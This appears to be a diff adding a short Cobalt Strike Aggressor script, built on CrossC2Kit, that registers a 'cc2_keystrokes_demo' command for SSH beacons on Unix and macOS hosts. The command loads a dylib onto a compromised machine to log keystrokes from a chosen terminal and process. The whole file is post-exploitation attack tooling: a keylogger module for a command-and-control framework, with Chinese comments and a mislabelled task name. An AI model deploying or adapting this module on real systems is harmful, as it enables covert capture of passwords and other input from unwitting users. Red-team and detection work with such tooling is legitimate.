@@ -1,0 +1,20 @@
+
+include(script_resource("CrossC2Kit.cna"));
+
+ssh_alias cc2_keystrokes_demo {
+    $taskName = "cc2_portscan"; # 该任务的名称
+    $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
+    $taskResType = "keystrokes"; # task返回值类型定义参考 "#变量定义"
+    $loadlib = "./cc2_keystrokes_demo.dylib"; # 需要载入的动态库/可执行文件
+
+    $beaconid = $1;
+    $tty = $2;
+    $pid = $3;
+    $transportArg = $tty . "^" . $pid;
+
+    blog($beaconid, "keystrokes: " . $tty . " " . $pid);
+
+    bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+}
+
+ssh_command_register("cc2_keystrokes_demo", "Unix keystrokes", "Use: cc2_keystrokes_demo [tty] [pid]");
